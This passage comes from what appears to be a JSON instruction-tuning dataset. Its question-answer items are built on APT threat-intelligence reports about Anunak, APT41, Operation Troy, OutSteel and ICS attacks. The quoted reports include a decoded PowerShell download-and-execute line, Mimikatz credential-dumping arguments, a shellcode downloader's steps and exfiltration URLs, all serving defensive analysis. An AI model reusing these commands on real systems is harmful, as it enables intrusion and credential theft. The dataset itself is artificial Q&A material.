edge or a strategic goal. Rather, this activity, which takes place in the heat of a conflict, provides actionable military intelligence for an immediate battlefield advantage. It provides the type of insight that can thwart a vital supply route, reveal a planned ambush, and identify and track key individuals. This intelligence likely serves a critical role in the adversary's operational plans and tactical decisions. However, this tactical edge comes with a potentially devastating human cost.\n\nAnswer this question based on the above context: How did the threat group's focus on Skype databases contribute to their overall strategy, and what additional risks did this pose to the opposition?",
    "output": "By focusing on Skype databases, the threat group gained access to victims' contacts and real-time communications, providing an inside view into the opposition's relationships and plans. This allowed them to identify and target additional individuals within the opposition network. Given the shared use of devices, compromising a single device yielded the combined plans and communications of multiple aspects of the opposition. This intelligence could thwart supply routes, reveal planned ambushes, and track key individuals, providing immediate battlefield advantages but also posing a potentially devastating human cost.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: execuTive summAry\nThis report describes the details and type of operations carried out by an organized criminal group that focuses on financial industry, such as banks and payment providers, retail industry and news, media and PR companies. The group has its origin in more common financial fraud including theft from consumer and corporate bank accounts in Europe and Russia, using standard banking malware, mainly Carberp.\nAfter the arrests of Carberp group members in Russia, some of the members were out of work, however, their experience gained from many years of crime has allowed them to enter a new niche. One of the members quickly realized that they can steal $2000 a thousand times, and earn $2 million, but also they can steal it in one time and immediately get it with much less effort. The anti-fraud measures employed by banks has pushed the criminals to search for new ways to make money with less barriers, compromising and modifying or taking data from banks, payment providers, retail and media/ PR companies are some of these methods.\nFrom 2013 an organized criminal group intensified its activity focused on banks and electronic payment systems in Russia and in the post-Soviet space.\nThe key is that fraud occurs within the corporate network using internal payment gateways and internal banking systems. Thus money is stolen from the banks and payment systems, and not from their customers. While this is their main and most lucrative activity, the gang has also ventured into other areas including the compromise of media groups and other organizations for industrial espionage and likely a trading advantage on the stock market. In cases where the group got access to the government agency networks their aim was espionage related.\nThe organized criminal group backbone are citizens of both Russian and Ukrainian origin, but the group also sources a number of mainstream and specialized services from individuals and groups originating from Russia, Ukraine and Belarus.\nThe average sum of theft in the Russian territory and in the post-Soviet space is $2 million per incident. Since 2013 they have successfully gained access to networks of more than 50 Russian banks and 5 payment systems, and 2 of these institutions were deprived of their banking license. To date the total amount of theft is over 1 billion rubles (about 25 million dollars), most of it has been stolen in the second half of 2014.\nThe average time from the moment of penetration into the financial institutions internal network till successful theft is 42 days.\nAs a result of access to internal bank networks the attackers also managed to gain access to ATM management infrastructure and infect those systems with their own malicious software that further allows theft from the banks ATM systems on the attackers command.\nSince 2014 the organized criminal group members began actively taking an interest in US and European based retail organizations. While they were already familiar with POS malware and compromising POS terminals, the widespread media attention around the Target breach and other related breaches were the reason for this move. While the scale of breaches in this industry is still relatively low, with at least 3 successful card breaches and over a dozen retailers compromised this activity is quickly becoming a lucrative endeavor for this group.\nTo penetrate into the internal networks this organized criminal group employs targeted emailing (spear phishing) and infections sources from other botnets. This is the main reason why the group is\nkeeping in touch with owners of large botnets. Since August 2014 the group began to create their own large botnet using a mass emailing, but not using typical exploit driveby infections. This last move is likely to reduce the need for external contacts.\n\nQ: How did the Anunak APT group evolve from traditional financial fraud to targeting financial institutions directly, and what factors influenced this shift?",
    "output": "A: The Anunak APT group initially engaged in traditional financial fraud, such as stealing from consumer and corporate bank accounts using banking malware like Carberp. After the arrests of Carberp group members, some members leveraged their extensive criminal experience to target financial institutions directly. This shift was driven by the realization that stealing larger sums in fewer transactions could yield significant profits with less effort. Additionally, the increasing anti-fraud measures employed by banks pushed the criminals to seek new methods, including compromising and modifying data from banks, payment providers, retail, and media/PR companies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: GET TO DA CHOPPA!\nIn April 2019, FireEye's Managed Defense team identified suspicious activity on a publicly-accessible web server at a U.S.-based research university. This activity, a snippet of which is provided in Figure 1, indicated that the attackers were exploiting , a vulnerability in Atlassian Confluence Server that allowed for path traversal and remote code execution.\nThis vulnerability relies on the following actions by the attacker:\nCustomizing the _template field to utilize a template that allowed for command execution.\nInserting a cmd field that provided the command to be executed.\nThrough custom JSON POST requests, the attackers were able to run commands and force the vulnerable system to download an additional file. Figure 2 provides a list of the JSON data sent by the attacker.\nAs shown in Figure 2, the attacker utilized a template located at hxxps[:]//github[.]com/Yt1g3r/CVE-2019-3396_EXP/blob/master/cmd.vm. This publicly-available template provided a vehicle for the attacker to issue arbitrary commands against the vulnerable system. Figure 3 provides the code of the file cmd.vm.\nThe HTTP POST requests in Figure 2, which originated from the IP address 67.229.97[.]229, performed system reconnaissance and utilized Windows certutil.exe to download a file located at hxxp[:]//67.229.97[.]229/pass_sqzr.jsp and save it as test.jsp (MD5: 84d6e4ba1f4268e50810dacc7bbc3935). The file test.jsp was ultimately identified to be a variant of a .\nBig Headline: A Passive Aggressive Operation\nShortly after placing test.jsp on the vulnerable system, the attackers downloaded two additional files onto the system:\n64.dat (MD5: 51e06382a88eb09639e1bc3565b444a6)\nIns64.exe (MD5: e42555b218248d1a2ba92c1532ef6786)\nBoth files were hosted at the same IP address utilized by the attacker, 67[.]229[.]97[.]229. The file Ins64.exe was used to deploy the HIGHNOON backdoor on the system. HIGHNOON is a backdoor that consists of multiple components, including a loader, dynamic-link library (DLL), and a rootkit. When loaded, the DLL may deploy one of two embedded drivers to conceal network traffic and communicate with its command and control server to download and launch memory-resident DLL plugins. This particular variant of HIGHNOON is tracked as HIGHNOON.PASSIVE by FireEye. (An exploration of passive backdoors and more analysis of the HIGHNOON malware family can be found in our full ).\nWithin the next 35 minutes, the attackers utilized both the test.jsp web shell and the HIGHNOON backdoor to issue commands to the system. As China Chopper relies on HTTP requests, attacker traffic to and from this web shell was easily observed via network\nmonitoring. The attacker utilized China Chopper to perform the following:\nMovement of 64.dat and Ins64.exe to C:\\Program Files\\Atlassian\\Confluence\nPerforming a directory listing of C:\\Program Files\\Atlassian\\Confluence\nPerforming a directory listing of C:\\Users\nAdditionally, FireEye's FLARE team reverse engineered the custom protocol utilized by the HIGHNOON backdoor, allowing us to decode the attacker's traffic. Figure 4 provides a list of the various commands issued by the attacker utilizing HIGHNOON.\nAs shown in Figure 4, the attacker utilized the HIGHNOON backdoor to execute a PowerShell command that downloaded a script from , a well-known PowerShell Post-Exploitation Framework. At the time of this blog post, the script was no longer available for downloading. The commands provided to the script \u2013 \"privilege::debug sekurlsa::logonpasswords exit exit\" \u2013 indicate that the unrecovered script was likely a copy of , reflectively loading Mimikatz 2.0 in-memory. Per the observed HIGHNOON output, this command failed.\nAfter performing some additional reconnaissance, the attacker utilized HIGHNOON to download two additional files into the C:\\Program Files\\Atlassian\\Confluence directory:\nc64.exe (MD5: 846cdb921841ac671c86350d494abf9c)\nF64.data (MD5: a919b4454679ef60b39c82bd686ed141)\nThese two files are the dropper and encrypted/compressed payload components, respectively, of a malware family known as ACEHASH. ACEHASH is a credential theft and password dumping utility that combines the functionality of multiple tools such as Mimikatz, hashdump, and Windows Credential Editor (WCE).\nUpon placing c64.exe and F64.data on the system, the attacker ran the command c64.exe f64.data \"9839D7F1A0 -m\"\nThis specific command provided a password of \"9839D7F1A0\" to decrypt the contents of F64.data, and a switch of \"-m\", indicating the attacker wanted to replicate the functionality of Mimikatz. With the correct password provided, c64.exe loaded the decrypted and decompressed shellcode into memory and harvested credentials.\nUltimately, the attacker was able to exploit a vulnerability, execute code, and download custom malware on the vulnerable Confluence system. While Mimikatz failed, via ACEHASH they were able to harvest a single credential from the system. However, as Managed Defense detected this activity rapidly via network signatures, this operation was neutralized before the attackers progressed any further.\nBig Headline: Key Takeaways From This Incident\nAPT41 utilized multiple malware families to maintain access into this environment; impactful remediation requires full scoping of an incident.\nFor effective Managed Detection & Response services, having coverage of both Endpoint and Network is critical for detecting and responding to targeted attacks.\nAttackers may weaponize vulnerabilities quickly after their release, especially if they are present within a targeted environment. Patching of critical vulnerabilities ASAP is crucial to deter active attackers.\nRead the text above and answer this question: How did FireEye's Managed Defense team detect and respond to APT41's activities? What key takeaways can cybersecurity experts learn from this incident to improve their response strategies?",
    "output": "FireEye's Managed Defense team detected APT41's activities through network signatures, allowing them to rapidly identify and neutralize the operation before the attackers could progress further. The key takeaways from this incident are: 1) APT41 utilized multiple malware families to maintain access, emphasizing the importance of full scoping during incident response. 2) Effective Managed Detection & Response services require coverage of both endpoints and networks to detect and respond to targeted attacks. 3) Attackers may weaponize vulnerabilities quickly after their release, highlighting the need for prompt patching of critical vulnerabilities to deter active attackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: SENTRYO ICS CYBERVISION OFFERS AN OT MONITORING SOLUTION THAT PROVIDES AN OPERATIONAL CAPACITY TO PREVENT, DETECT AND RESPOND TO CYBERAT TACKS.\nICS CyberVision continuously listen communications between devices on the OT network and extract meaningful data. Those data are then used to create a behavorial \u00abtemplate\u00bb of the OT network which is then used as a white list to detect anomalies. ICS CyberVision use IA algorithms to caracterise and prioritize those anomalies in order to eliminate false positive and facilitate the remediation process.  In addition scripts from Sentryo Security Labs are provided to ICS CyberVision users. These scripts use the CyberVision Center API to mine their CyberVision installations to check for some Indicators of Compromise (IOC).\nIn the case of organization is in the energy sector and may have been targeted by this new Black Energy campaign or the latest Grizzly Steppe (see the DHS report), we strongly encourage them to run these scripts and check their ICS.\nMoreover, if ICS CyberVision had been deployed inside the process and control networks of an Energy corporation, it would have detected several weak signals enabling the local team to stop the attacks early:\nRegarding Black Energy, ICS CyberVision would have detected unknown connections to a remote Internet website (the C&C channels). These connections would have been seen as a change compared to the baseline (a set of given network behaviors) defined by plant operators.\nRegarding Industroyer/CrashOverride, ICS CyberVision would have detected any new connections to a remote Internet website (the C&C channels), and also new and strange behaviours on the OT networks like multiple OT network scans and critical OT communications like orders.\nRegarding the Disakil \"wiper\", ICS CyberVision would have detected the disappearance of TCP connections between the SCADA stations and the PLCs / RTUs. The defined baseline includes these connections and the fact that they stopped being active would have automatically been detected as a change by the difference engine.\nRegarding the breaker manipulation, ICS CyberVision would have analysed IEC 101 (serial over ethernet) flows and detected the order to open up the breaker and to switch off power. CyberVision would help to trace down the hackers to particular infected machines.\nRegarding the Siemens safety equipment DoS vulnerability used by Industroyer (CVE-2015-5374), it will be detected by ICS Cybervision thanks to its Knowledge Database. Back in 2015, Siemens provided a firmware update fixing this issue. It is even more important today to patch these equipments. Our solution can help by clearly identifying the potentially affected devices in the network.\nThe only vector which would have remained undetected by ICS CyberVision is the \"dropper\" i.e. an Excel spreadsheet or Word document in later case. It is the responsibility of an email gateway or an endpoint protection software to detect such attack vectors. The malware could also have been inserted via a malicious USB drive and only endpoint protection software can prevent these attacks.\nSince Stuxnet, the malware Industroyer / CrashOverride is the first advanced and targeted industrial malware we have seen with this level of maturity. From a defense point of view, this malware also shows the need for an ICS network security monitoring capability to be able to detect these advanced attacks early in the kill chain.\nLet's have look at the kill chain and the malware impact. This is important because investigations are still ongoing and some information may have not been communicated. Because of this, Phase 1 and part of the Phase 2 are pure assumptions using our experience and external claims:\nPHASE 1\nMedium Headline: BY VYTAUTAS BUTRIMAS -SUBJECT MAT TER EXPERT, RESEARCH AND LESSONS LEARNED DIVISION, NATO ENERGY SECURITY CENTER OF EXCELLENCE2\nToday's cyber attacker is several steps ahead of the defender. This is especially so in the case of a single operator trying to defend against a state resourced APT attacker. This is an unfair match, similar to a high-school soccer team's chances of defeating a FIFA World Cup contender. It is no contest unless the school team's capabilities are significantly enhanced. It is important to realize that the operator-defender has a complex task of managing and protecting increasingly interconnected and sophisticated systems enabled with the latest advances in information and communications technologies (ITC).\nTechnologies that in addition to providing new features and possibilities for remote management and control also introduce vulnerabilities for an adversary to exploit. The operator now faces a difficult challenge in managing systems that are vulnerable to not only intentional but also unintentional cyber incidents. Incidents that result from errors in managing interconnected and complex systems. The attacker needs only to find a single weakness in the design or exposed vulnerability in order to defeat all the wide-ranging efforts of the defender.\nIn order for the operator of critical infrastructure to avoid becoming an isolated target for an adversary that often is several steps ahead of the defender he must improve his relationship among operators of critical infrastructure, manufacturers, academia and Government institutions responsible for cybersecurity. The aim should be in setting up a mechanism that will facilitate the timely sharing of information on cyber threats, coordinating a response to an incident and sharing lessons learned. At the local level, National cybersecurity councils that represent the communities of interest (CoI) should be created as a first step in setting up a national cybersecurity capacity for protecting critical infrastructure from these advanced and persistent threats from cyberspace.\nThis is not an easy task since fear of lawsuits, embarrassment and concerns for confidentiality often make operators as well as manufacturers of control equipment reluctant to share the information needed to enhance resilience and enhance recovery capabilities. This lack of sharing can only contribute to making defenders more isolated and less aware of the significance\nof the problem. In addition to the high level National council a working level network for timely sharing of threat information and lessons learned should be created for dealing with immediate issues and facilitating coordinated effective response in times of emergency. In summary it is only through cooperation and sharing of information among a community of interest that an operator-defender can hope to deal with today's advanced and persistent threats emanating from cyberspace.\n14\n2. The views expressed by V. Butrimas are for NATO, NATO member countries, NATO partners, related private and public institutions and related individuals.These views do not represent the opinions or policies of NATO or NATO ENSEC COE or any other institution. The views presented in the articles are those of the authors alone.\nBig Headline: FROM THE FOREWORD\nCritical Infrastructure: \"refers to assets of physical and computer-based systems that are essential to the minimum operations of an economy and its government. They include\u2026 telecommunications, energy, banking and finance, transportation, water systems and emergency services, both government and private.\" http://www.infracritical.com/?page_id=73\nLangner, R., To Kill a Centrifuge,\nhttp://www.langner.com/en/wp-content/uploads/2013/11/ To- kill-a-centrifuge.pdf\nRashid, F., Inside The Aftermath Of The Saudi Aramco Breach, Dark Reading, 8/8/2015\nhttp://www.darkreading.com/attacks-breaches/inside-the-aftermath-of-the- saudi-aramco-breach/d/d-id/1321676\nAlert (ICS-ALERT-14-281-01E) Ongoing Sophisticated Malware Campaign Compromising ICS (Update E) US ICS-CERT\nhttps://ics-cert.us- cert.gov/alerts/ICS-ALERT- 14-281- 01B\nOriginal release date: December 10, 2014\nSandworm and SCADA, Trend Micro\nhttp://blog.trendmicro.com/sandworm-and-scada/ October 16, 2014\nThe State of IT Security in Germany 2014, Federal IT Department (BSI) Germany. p. 31.\nhttps://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/ Publications/Securitysituation/IT-Security-Situation-in-Germany- 2014.pdf?__blob=publicationFile&v=3\nRead the text above and answer this question: Why is it essential for operators of critical infrastructure to establish a mechanism for sharing information on cyber threats, and what role does cooperation play in defending against advanced and persistent threats?",
    "output": "It is essential for operators of critical infrastructure to establish a mechanism for sharing information on cyber threats because it enhances their ability to coordinate responses, learn from each other's experiences, and stay informed about emerging threats. Cooperation plays a crucial role in defending against advanced and persistent threats because it allows operators to pool resources, expertise, and intelligence, thereby reducing the isolation of individual defenders and improving overall resilience. This cooperation should involve operators, manufacturers, academia, and government institutions responsible for cybersecurity, ideally through National cybersecurity councils and working-level networks for timely sharing of threat information and lessons learned.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Linking to the Attackers\nLinking malware to its developers isn't always an easy task. Most attackers are careful enough to ensure they can't be traced. This is especially important in cases such as cyberespionage, in which the intent is to remain invisible.\nIn our analysis we observed a number of unique attributes in the components involved in these attacks; these markers allowed us to link specific samples to a specific group.\nTwo groups have taken credit for these attacks, but we can tell that the variants which wiped the systems link to the NewRomanic Cyber Army Team.\nAlthough the Whois Hacking Team is more public due to its defacement of the network provider LG +U's website, we can link this group to only one sample of a wiper, which operates differently than the others. The Whois wiper is much larger, with a file size of 236KB and was compiled March 19, whereas the other wiper components are a mere 24KB. The larger size suggests the Whois wiper contains more functions. Thus, we can definitively link NewRomanic to the samples used to wipe the MBRs of systems within the South Korean financial institution networks. NewRomanic will remain the prime suspect involved in the attacks.\nConfirming the link between NewRomanic and known wiper samples, we found a number of wiper samples contained either the string \"hastati\" or \"principes\" in the calling cards left by the attacker.\nNot only did most of the wiper samples link to NewRomanic, but the remote-access Trojan can also be linked to the group. The Trojan contained a build path that mentions Troy in the directory path, again consistent with the ancient Roman references used by this group.\nBig Headline: Code Analysis\nIt is highly unusual that two groups claim responsibility for these attacks. No further information has been revealed as to who they are or what their motivations are; this is another reason to suspect that these two groups are the same and are actually fabricated. The supporting evidence comes in the form of code analysis determining the degree of similarity between the samples.\nThe Whois Hacking Team sample was compiled March 19 at 1:57 pm local time and the NewRomanic dropper was compiled March 20 at 4:07 am local time. The attacks on South Korean banks and media and the defacement of LG +U occurred approximately 2:00 pm local time on March 20.\nMcAfee Labs investigated the differences between the two samples at a code level to determine if there were any similarities. In spite of the fact that the wiper component originating from NewRomanic Cyber Army Team was 24KB in size and the component from Whois was 236KB, we did find similarities within the code. The Whois sample is a dropper for a component that closely resembles the one used by the NewRomanic Cyber Army. We found a significant number of matching subroutines and a large number of code segments with only minor differences. These similarities lead us to conclude that the payload code is based upon the same initial code and was embedded into different droppers.\nRevealing \"Operation Troy\"\nPersistent espionage campaign in South Korea: 2009\u20132013\nPublic reports covering what is known as the Dark Seoul incident, which occurred on March 20, 2013, addressed only the MBR wiper components. Many of the details of this incident have been examined, and most analysts conclude this was an isolated, though clearly coordinated, attack. However, McAfee Labs has found that there was more to the incident than what was widely reported. Our analysis has revealed a covert espionage campaign.\nTypically this sort of advanced persistent threat (APT) campaign has targeted a number of sectors in various countries, but Operation Troy, as these attacks are now called, targets solely South Korea.\nFrom our analysis of unique attributes within the malware samples we have determined that the initial code behind the \"Troy\" family of Trojans was created in 2010, as was another component that was dropped by the Trojan HTTP Troy. The malware used in these attacks were compiled to specifically target South Korea and used Korean-language resources in the binaries. The malware connected to legitimate Korean domains that were running a bulletin board and sent a specific command to a PHP page to establish an IRC channel and receive commands.\nEspionage Campaign\nMcAfee Labs has determined that domestic espionage activities occurred before the March 20 attacks, most likely to gain intelligence regarding the targets to carry out further attacks (such as the March 20 incident) or to benefit the attackers in some other ways. This spying operation had remained hidden and only now has been discovered through diligent research and collaboration. We also suspect the attackers had knowledge of the security software running within the environment before they wiped the systems, given that some of the variants used in the attack were made to look as if they were antimalware update files from before March 20.\nThe attackers who conducted the operation remained hidden for a number of years prior to the March 20 incident by using a variety of custom tools. Our investigation into Dark Seoul has found a long-term domestic spying operation underway since at least 2009. The operation, all based on the same code, has attempted to infiltrate specific South Korean targets. We call this Operation Troy, based on the frequent use of the word Troy in the compile path strings in the malware. The prime suspect group in these attacks is the New Romanic Cyber Army Team, which makes frequent use of Roman and classical terms in their code. While analyzing malware components from before the March 20 incident we found both similar and identical attributes of the files involved that enable us to link them to the 3Rat remote administration tool client used on March 20 as well as to samples dating to 2010. Furthermore, we determined that through prior access to the victims' networks, the attackers were able to upload the MBR wiper component and distribute it. It is also possible that the campaign known as 10 Days of Rain is a byproduct of Operation Troy; some of our analysis suggests that the malware Concealment Troy was present in these attacks.\nBig Headline: NSTAR: 2010\u20132011\nNSTAR appears to be the first production version of the Troy family. This Trojan is based upon malware created for a military espionage campaign that first emerged in 2009. NSTAR is the first to use components in the same way that later variants of the Troy family do. It included a shared DLL (bs.dll) that was found in the 2010 and 2011 variants. Later variants use a modified version, HTTPSecurityProvider.dll, which employs nearly the same file-mapping function as used by bs.dll. Most of these variants are compiled from the Work directory; that's fairly consistent throughout all versions. The DLL was compiled using Microsoft Visual C++ Version 6. Those iterations were found in 2010-2011.\nThe call graph generated for NSTAR's bs.dll is identical with that of HTTP Troy. They were compiled at least a year apart from each other.\nThe DLL was compiled March 3, 2011, and includes an OCX component that was compiled in late 2010. The OCX used a very different compile path, but bs.dll, the backdoor, is essentially the same as those seen in later versions.\nThe Work directory, with path shown below, is also used with Troy variants Concealment Troy and 3Rat Client, which were both compiled in 2013.\nE:\\Work\\BackUp\\2011\\nstar_1103\\BackDoor\\BsDll-up\\Release\\BsDll.pdb\nWe also found a file-mapping function in this variant similar to those in most of the newer versions. The unique string beginning with \"FFFFFFF\" is identical and occurs throughout the later variants.\nThe malware establishes an IRC channel to receive real-time commands in the same manner as the military espionage malware.\nBig Headline: Chang and EagleXP: 2010\nAnother variant from 2010, EagleXP, is closely related to NSTAR and HTTP Troy based on reused components. EagleXP used this compile path:\nD:\\VMware\\eaglexp(Backup)\\eaglexp\\vmshare\\Work\\BsDll-up\\Release\\BsDll.pdb\nAgain we see the Work directory involved as in the other post-2010 malware used in this campaign. A variant compiled May 27, 2010, also contained a very similar compile path. We were able to obtain some traffic from the control server.\nD:\\\\Chang\\\\vmshare\\\\Work\\\\BsDll-up\\\\Release\\\\BsDll.pdb\nThe May 27 variant, called Chang, operated in the same manner as other Troy variants and used the same bs.dll. A Korean manufacturing website hosted both the control server and an IRC server.\nBoth the Chang and EagleXP variants are based on the same code that created NSTAR and later Troy variants. These similarities confirm the attackers have operated for more than three years against South Korean targets.\nBig Headline: Inside the IRC botnet\nDuring our investigation we dug into the attackers' controlling botnet, which was used until 2013. The infrastructure relied upon on a network of hacked South Korean websites hosting IRC servers. The infected clients in turn communicated with the IRC servers using RSA encryption and used functions imported from the Microsoft Cryptography API library.\nThe attackers hardcoded the control domains in bs.dll and distributed it in the final compiled Trojan code. Each variant of each generation of Trojans contained different hardcoded strings pertaining to the control servers. This shows that the attackers first compromised the future IRC server sites and then compiled the component and distributed it to infected targets.\nThe nickname for the bot can be determined by the outbound traffic and information written to the Windows registry. One variant operating in June 2010 used the nickname BS^000C2918AB11 with the password wodehaopeng. The malware joined the IRC channel #god and sent several private messages to what was likely the control server to receive instructions.\nRead the text above and answer this question: What key similarities were found between the Whois Hacking Team sample and the NewRomanic dropper during the code analysis of Operation Troy? How did these similarities contribute to the conclusion that the payload code was based on the same initial code?",
    "output": "During the code analysis of Operation Troy, McAfee Labs found significant similarities between the Whois Hacking Team sample and the NewRomanic dropper. Despite the size difference (the Whois sample being 236KB and the NewRomanic dropper being 24KB), there were a significant number of matching subroutines and a large number of code segments with only minor differences. These similarities led to the conclusion that the payload code was based on the same initial code and was embedded into different droppers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: May 2021 Attacks\nIn May 2021, we saw the threat group sending targeted emails sent to two Ukrainian government organizations. The two emails had subjects of \u0417\u0430\u044f\u0432\u0430 \u21164872823 and \u0417\u0430\u044f\u0432\u0430 \u2116487223/2, and both had the same message content that suggested the email was from a senior investigator trying to contact the individual, as seen in Figure 26. The use of law enforcement related themes across May and June 2021, as well as in February 2022, suggests that the threat group favors this social engineering theme in the absence of a trending topic or current event.\nBoth of the delivery emails had the same attachment, specifically \u0417\u0430\u044f\u0432\u0430 \u21164872823-(20).cpl (SHA256: f4a56c86e2903d509ede20609182fbe001b3a3ca05f8c23c597189935d4f71b8), which is a Windows Control Panel File that acts as an initial downloader to download and execute a payload from:\n32689657[.]xyz/putty5482.exe\nThe Control Panel File saves the downloaded executable to %PUBLIC%\\puttys.exe and runs it using the WinExec function. The resulting executable (SHA256: df3b1ad5445d628c24c1308aa6cb476bd9a06f0095a2b285927964339866b2c3) eventually runs the OutSteel document stealer, which will exfiltrate files to the following URL:\nhxxp://194[.]147.142.232/upld/\nMedium Headline: June 2021 Attacks\nIn June 2021, we observed this threat group targeting another Ukrainian government organization by sending a spear phishing email with a subject that translates to \"Your arrest warrant\" from Ukrainian. The content of this email, seen in Figure 27, includes urgent language suggesting that the recipient must read the attached report or they will be declared \"wanted.\" This law enforcement theme relates to the Feb. 1, 2022, attacks that used a supposed police report as part of social engineering.\nThe attachment is not a report as the body of the email suggests. Rather, the \u0417\u0430\u044f\u0432\u0430 \u2116487223-31.doc (880m5) .js file attached is a JavaScript file that is 1,029,786 bytes in size (the actors added a considerable amount of spaces between each character of the JavaScript code). If the recipient opens the attachment, the following JavaScript will execute:\nThe JavaScript above will run an encoded PowerShell script that decodes to the following:\ninvOKe-WeBREqUEST -urI hxxp://150520212[.]space/000.cpl -oUtFILE $ENv:PuBLiC\\000.cpl; & $eNV:PUBlIc\\000.cpl\nThis PowerShell script will download and execute a Control Panel File (CPL) from 150520212[.]space, which it saves to a file named 000.cpl (SHA256: b72188ba545ad865eb34954afbbdf2c9e8ebc465a87c5122cebb711f41005939). The 000.cpl is a DLL whose functional code exists within the exported function CPlApplet. The functional code uses several consecutive jumps in an attempt to make code analysis more difficult. Despite these jumps, the functional code starts with a decryption stub, which will XOR each QWORD in the ciphertext using a key that starts as 0x29050D91. However, in each iteration of the decryption loop, the key is modified by multiplying it by 0x749507B5 and adding 0x29050D91.\nOnce the decryption stub has finished, the code jumps to the decrypted code, which is a shellcode-based downloader that carries out the following activity:\n1. Loads kernel32 using LoadLibraryW\n2. Gets the address to ExpandEnvironmentStringsW using GetProcAddress\n3. Calls ExpandEnvironmentStringsA to expand the environment string for the path %PUBLIC%\\5653YQ5T3.exe\n4. Opens the %PUBLIC%\\5653YQ5T3.exe file using CreateFileW\n5. Loads WinHttp using LoadLibraryA\n6. Opens an HTTP session by calling WinHttpOpen\n7. Connects to remote server 150520212[.]space over port 80/TCP by calling WinHttpConnect\n8. Creates an HTTP GET request for /0404.exe using WinHttpOpenRequest\n9. Sends the request via WinHttpSendRequest\n10. Calls WinHttpReceiveResponse, WinHttpQueryDataAvailable and WinHttpReadData to get the HTTP response data\n11. Writes the response data to %PUBLIC%\\5653YQ5T3.exe by calling WriteFile\n12. Closes handle to %PUBLIC%\\5653YQ5T3.exe by calling CloseHandle\n13. Runs %PUBLIC%\\5653YQ5T3.exe by calling ShellExecuteW\n14. Finishes by calling ExitProcess\nThe file hosted at 150520212[.]space/0404.exe (SHA256: cb4a93864a19fc14c1e5221912f8e7f409b5b8d835f1b3acc3712b80e4a909f1) is an OutSteel sample that gathers and exfiltrates files to http://45[.]146.164.37/upld/.\nMedium Headline: July 2021 Targeting\nOn July 22, 2021, we observed a spear phishing attempt in which the threat group targeted a Western government entity in Ukraine. The actors sent the email to an address publicly displayed on the embassy's website with the subject RE: CV. The email had a Word document attached to it with a filename structured as <first name>_<last name>_CV.doc, of which the name was a well-known journalist in Ukraine. Figure 29 shows the contents of the attached document as it would display in a native Ukrainian installation of Windows.\nThe content of the document is meant to resemble a resume of the journalist. However, the garbled text suggests an encoding issue that the Ukrainian version of Windows could not display. The image is a stock photo available at several websites [][][(<http://www.apimages.com/metadata/MSIndex/One-female-specialists-staying-on-work-office/243123332/517>)3], which does not appear to be a picture of the actual journalist. The garbled text is likely intentional as an attempt to trick the user into clicking the \"Enable Editing\" button, which would ultimately run the macro embedded in the document. The macro that will run if the user clicks the \"Enable Editing\" button, seen in Figure 30, creates a batch script called meancell.bat that executes a PowerShell command that will use the Start-BitsTransfer cmdlet to download a payload from hxxp://1833[.]site/kpd1974.exe. It then saves it to and executes everylisten.exe. Figure 30 shows the contents of the macro found in this delivery document.\nThe kpd1974.exe file (SHA256: b8ce958f56087c6cd55fa2131a1cd3256063e7c73adf36af313054b0f17b7b43) downloaded and executed by the macro ultimately runs a variant of the OutSteel document harvesting tool that exfiltrates files to hxxp://45.146.165[.]91:8080/upld/. We found two additional delivery documents that shared a similar macro and hosted\nthe payload on the 1833[.]site, as seen in Table 5. One of the filenames of these two related documents suggest that the threat group continued to use the fake resume theme.\nAnswer this question: What was the purpose of the macro embedded in the Word document sent in the July 2021 spear phishing attempt, and how did it facilitate the execution of the OutSteel document stealer?",
    "output": "The macro embedded in the Word document sent in the July 2021 spear phishing attempt was designed to create and execute a batch script called 'meancell.bat'. This batch script ran a PowerShell command that used the Start-BitsTransfer cmdlet to download a payload from a specified URL and saved it as 'everylisten.exe'. The downloaded file was a variant of the OutSteel document harvesting tool, which exfiltrated files to a designated server. The macro was activated when the user clicked the 'Enable Editing' button, which was encouraged by the garbled text and stock photo in the document, intended to trick the user into enabling macros.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 4.3 SA Analysis \u2013 Trojan.Lurker\nOne of the approaches that the RSA IR team uses to identify malicious network traffic relies on identifying anomalies in\t\n \u00a0network protocols. Most Trojans do\t\n \u00a0not follow protocol standards and\t\n \u00a0thus can\t\n \u00a0be detected based on these anomalies. For example, Trojan.Lurker is a\t\n \u00a0classic HTTP\t\n \u00a0Trojan. Detection depends on knowledge\t\n \u00a0of the\t\n \u00a0HTTP\t\n \u00a0protocol and detecting\t\n \u00a0anomalies and non-\u00ad\u2010standard traffic. In this case the Trojan stood out\t\n \u00a0for\t\n \u00a0several reasons:\n1. First, the\t\n  Trojan had to use\t\n  the\t\n  POST\t\n  method to send data\t\n  to the\t\n  server. There\t\n  is no RFC mandated maximum HTTP Header size, although the default limits on Apache are 8KB and on IIS, 16KB. Trojans generally attempt to follow standards to allow the requests to be handled by proxies, if\t\n  they exist\t\n  in the environment. For\t\n  that\t\n  reason, most HTTP Trojans utilize the GET and POST method to facilitate a command shell that appears to be standard HTTP\t\n  traffic. The POST\t\n  Method traffic in most environments is generally 10% of overall HTTP\t\n  traffic, making it easier for the\t\n  analyst to find malicious sessions.\n2. Second, the\t\n \u00a0Trojan uses a\t\n \u00a0short MSIE\t\n \u00a07\t\n \u00a0User-\u00ad\u2010Agent that identifies itself as Windows XP 64 bit Operating System.\n3. Third, the Trojan is using only 3\t\n \u00a0HTTP\t\n \u00a0headers, a\t\n \u00a0very low amount, and doesn't follow best practices for\t\n \u00a0HTTP/1.1; the Content-\u00ad\u2010Type header is not present for\t\n \u00a0the POST method.\nWe now highlight these items in the actual payload of the traffic:\nRSA\t\n  discovered\t\n  HTTP sessions to\t\n  these IP's containing both\t\n  Windows PE's as well as encrypted\t\n  header RAR's. The command shell was\t\n  encrypted, but files\t\n  sent via the C2 channel were in the clear. The first PE to be sent was\t\n  rar.exe.\nNext, a RAR archive with additional tools was sent to\t\n  the infected\t\n  host.\nA\t\n  batch\t\n  script was then\t\n  uploaded\t\n  and\t\n  executed\t\n  by subsequent commands. As can\t\n  be seen\t\n  from the previous to\t\n  examples as well, this Trojan download files in plaintext.\nRSA\t\n  IR\t\n  